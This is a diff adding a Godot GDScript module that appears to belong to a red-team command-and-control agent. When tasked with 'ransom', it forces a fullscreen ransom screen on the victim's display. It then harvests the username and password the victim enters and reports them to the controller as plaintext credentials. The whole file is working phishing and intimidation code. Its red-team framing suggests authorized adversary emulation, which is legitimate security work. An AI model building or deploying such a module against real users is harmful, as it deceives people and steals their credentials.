@@ -1,0 +1,80 @@
+extends Node
+
+var display_size
+var parent
+var gui
+var api
+var task_id
+
+func _ready():
+	display_size = Vector2(1024,768)
+	parent = $".".get_parent()
+
+	api = parent.get_node("api")
+	gui = parent.get_node("GUI")
+
+func show():
+	# var window_size = OS.get_window_size()
+	# OS.set_window_position(screen_size*0.5 - window_size*0.5) # If not fullscreen
+
+	var screen_size = OS.get_screen_size(0)
+
+	OS.set_window_position(Vector2(0,0))
+
+	OS.set_window_title("")
+	OS.window_fullscreen = true
+	#OS.window_size = screen_size
+
+	gui.position = screen_size*0.5 - display_size*0.75
+
+	gui.show()
+
+func hide():
+	gui.hide()
+	
+	OS.set_window_title("")
+	OS.window_fullscreen = false
+	OS.window_size = Vector2(1,1)
+	gui.position = Vector2(-1,-1)
+	gui.reset()
+
+func _on_tasking_ransom(task):
+
+	if task.has("command") and task.get("command") == "ransom":
+		show()
+		task_id = task.get("id")
+		
+		api.agent_response(
+			api.create_task_response(
+				true,
+				false,
+				task_id,
+				"ransom screen displayed",
+				[], #TODO: any artifact id we can use to track that a ransom screen was shown to the user?
+				[]
+			)
+		)
+	else:
+		print("bad ransom task: ", task)
+	# TODO: agent_response in failure cases
+
+func _on_GUI_verify_username_password(username, password):
+	hide() # TODO: or just keep it up until the redteam member decides it should go away?
+
+	api.agent_response(
+		api.create_task_response(
+			true,
+			true,
+			task_id,
+			"ransom screen collected credentials",
+			[],
+			[
+				{
+					"credential_type": "plaintext",
+					"realm": "spooky.local",
+					"credential": password,
+					"account": username,
+				}
+			]
+		)
+	)
